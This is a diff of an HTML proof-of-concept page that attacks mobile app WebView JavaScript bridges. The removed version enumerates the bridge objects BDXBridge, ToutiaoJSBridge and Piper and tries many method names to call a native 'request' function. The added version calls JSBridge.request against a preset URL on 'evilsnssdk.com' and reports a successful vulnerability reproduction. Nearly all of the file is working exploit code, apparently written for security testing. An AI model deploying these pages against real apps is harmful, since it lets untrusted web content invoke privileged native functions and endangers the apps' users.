@@ -1,189 +1,74 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>JSB request PoC</title>
-  <style>
-    body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 16px; }
-    input, button { width: 100%; box-sizing: border-box; margin: 8px 0; padding: 10px; }
-    button { background: #1677ff; color: white; border: 0; border-radius: 6px; }
-    pre { background: #f5f5f5; padding: 12px; white-space: pre-wrap; word-break: break-all; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JSBridgeShootsAutoTest</title>
+    <style>
+        body { font-family: -apple-system; padding: 16px; }
+        textarea { width: 100%; height: 120px; font-family: monospace; }
+        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 8px; color: white; font-size: 16px; }
+        #run { background: #007AFF; }
+        #reset { background: #FF3B30; }
+        #response { background: #f5f5f5; padding: 12px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; }
+    </style>
 </head>
 <body>
-  <h3>JSB request PoC</h3>
+    <h3>JSBridge Method</h3>
+    <input id="method" type="text" value="request" style="width:100%;padding:10px;font-size:16px;">
+    
+    <h3>JSBridge Request</h3>
+    <textarea id="params">{"url": "https://evilsnssdk.com/jsb_test/33eca3a2f55edf4c712978f44c9bbf19/1/177041520205822863", "method": "GET"}</textarea>
+    
+    <button id="run" onclick="runJSB()">RUN</button>
+    <button id="reset" onclick="reset()">RESET</button>
+    
+    <h3>JSBridge Response</h3>
+    <div id="response">等待执行...</div>
+    
+    <h3>Valid Result</h3>
+    <div id="valid"></div>
 
-  <label>JSB Name</label>
-  <input id="jsbName" value="request">
-
-  <label>Request URL</label>
-  <input id="targetUrl" value="https://httpbin.org/get?from=jsb_poc">
-
-  <label>Method</label>
-  <input id="method" value="GET">
-
-  <button onclick="runPoC()">Call JSB</button>
-
-  <h4>Result</h4>
-  <pre id="log"></pre>
-
-<script>
-  function log(msg) {
-    const el = document.getElementById('log');
-    el.textContent += (typeof msg === 'string' ? msg : JSON.stringify(msg, null, 2)) + '\n';
-  }
-
-  function safeKeys(obj) {
-    if (!obj) return [];
-    const keys = new Set();
-    let cur = obj;
-    while (cur && cur !== Object.prototype) {
-      try {
-        Object.getOwnPropertyNames(cur).forEach(k => keys.add(k));
-      } catch (e) {}
-      cur = Object.getPrototypeOf(cur);
+    <script>
+    function runJSB() {
+        var method = document.getElementById('method').value;
+        var params = JSON.parse(document.getElementById('params').value);
+        var responseDiv = document.getElementById('response');
+        var validDiv = document.getElementById('valid');
+        
+        responseDiv.innerHTML = '执行中...';
+        validDiv.innerHTML = '';
+        
+        // 等待 JSBridge 就绪
+        function callBridge() {
+            if (window.JSBridge && typeof window.JSBridge.call === 'function') {
+                window.JSBridge.call(method, params, function(res) {
+                    responseDiv.innerHTML = JSON.stringify(res, null, 2);
+                    if (res && res.code === 1) {
+                        validDiv.innerHTML = '✅ Valid Result - 漏洞复现成功';
+                        validDiv.style.color = 'green';
+                    } else {
+                        validDiv.innerHTML = '❌ Invalid Result';
+                        validDiv.style.color = 'red';
+                    }
+                });
+            } else if (window.TTJSBridge && typeof window.TTJSBridge.call === 'function') {
+                // 兼容旧版 TTBridge
+                window.TTJSBridge.call(method, params, function(res) {
+                    responseDiv.innerHTML = JSON.stringify(res, null, 2);
+                });
+            } else {
+                responseDiv.innerHTML = 'JSBridge 未就绪，500ms 后重试...';
+                setTimeout(callBridge, 500);
+            }
+        }
+        callBridge();
     }
-    return Array.from(keys).sort();
-  }
-
-  function bridgeKeys() {
-    return Object.keys(window).filter(k => /bridge|piper|jsb|toutiao|native|bdx/i.test(k));
-  }
-
-  function dumpBridgeObject(name) {
-    const obj = window[name];
-    log('==== ' + name + ' ====');
-    log('type: ' + typeof obj);
-    log(safeKeys(obj));
-  }
-
-  function buildParams() {
-    return {
-      url: document.getElementById('targetUrl').value,
-      method: document.getElementById('method').value
-    };
-  }
-
-  function tryCall(name, fn) {
-    try {
-      const ok = fn();
-      if (ok) {
-        log('Used bridge API: ' + name);
-        return true;
-      }
-    } catch (e) {
-      log(name + ' error: ' + e.message);
+    
+    function reset() {
+        document.getElementById('response').innerHTML = '等待执行...';
+        document.getElementById('valid').innerHTML = '';
     }
-    return false;
-  }
-
-  function runPoC() {
-    document.getElementById('log').textContent = '';
-
-    const method = document.getElementById('jsbName').value || 'request';
-    const params = buildParams();
-
-    log('Page URL: ' + location.href);
-    log('Bridge keys:');
-    log(bridgeKeys());
-
-    dumpBridgeObject('BDXBridge');
-    dumpBridgeObject('JS2NativeBridge');
-    dumpBridgeObject('ToutiaoJSBridge');
-    dumpBridgeObject('Piper');
-
-    log('Calling: ' + method);
-    log(params);
-
-    const callback = function(res) {
-      log('Callback result:');
-      log(res);
-    };
-
-    const candidates = [
-      ['BDXBridge.call', function() {
-        return window.BDXBridge &&
-          typeof window.BDXBridge.call === 'function' &&
-          (window.BDXBridge.call(method, params, callback), true);
-      }],
-
-      ['BDXBridge.invoke', function() {
-        return window.BDXBridge &&
-          typeof window.BDXBridge.invoke === 'function' &&
-          (window.BDXBridge.invoke(method, params, callback), true);
-      }],
-
-      ['BDXBridge.callHandler', function() {
-        return window.BDXBridge &&
-          typeof window.BDXBridge.callHandler === 'function' &&
-          (window.BDXBridge.callHandler(method, params, callback), true);
-      }],
-
-      ['BDXBridge.send', function() {
-        return window.BDXBridge &&
-          typeof window.BDXBridge.send === 'function' &&
-          (window.BDXBridge.send(method, params, callback), true);
-      }],
-
-      ['BDXBridge.call x.request', function() {
-        return window.BDXBridge &&
-          typeof window.BDXBridge.call === 'function' &&
-          (window.BDXBridge.call('x.request', params, callback), true);
-      }],
-
-      ['BDXBridge.invoke x.request', function() {
-        return window.BDXBridge &&
-          typeof window.BDXBridge.invoke === 'function' &&
-          (window.BDXBridge.invoke('x.request', params, callback), true);
-      }],
-
-      ['ToutiaoJSBridge.call', function() {
-        return window.ToutiaoJSBridge &&
-          typeof window.ToutiaoJSBridge.call === 'function' &&
-          (window.ToutiaoJSBridge.call(method, params, callback), true);
-      }],
-
-      ['ToutiaoJSBridge.invokeMethod', function() {
-        return window.ToutiaoJSBridge &&
-          typeof window.ToutiaoJSBridge.invokeMethod === 'function' &&
-          (window.ToutiaoJSBridge.invokeMethod(method, params, callback), true);
-      }],
-
-      ['Piper.invoke', function() {
-        return window.Piper &&
-          typeof window.Piper.invoke === 'function' &&
-          (window.Piper.invoke(method, params, callback), true);
-      }]
-    ];
-
-    for (const item of candidates) {
-      if (tryCall(item[0], item[1])) {
-        return;
-      }
-    }
-
-    log('No callable bridge API matched.');
-  }
-
-  document.addEventListener('DOMContentLoaded', function() {
-    log('DOM loaded.');
-    log('Bridge keys:');
-    log(bridgeKeys());
-    dumpBridgeObject('BDXBridge');
-    dumpBridgeObject('JS2NativeBridge');
-  });
-
-  document.addEventListener('ToutiaoJSBridgeReady', function() {
-    log('ToutiaoJSBridgeReady fired.');
-    log('Bridge keys:');
-    log(bridgeKeys());
-  });
-
-  document.addEventListener('BDXBridgeReady', function() {
-    log('BDXBridgeReady fired.');
-    log('Bridge keys:');
-    log(bridgeKeys());
-  });
-</script>
+    </script>
 </body>
 </html>
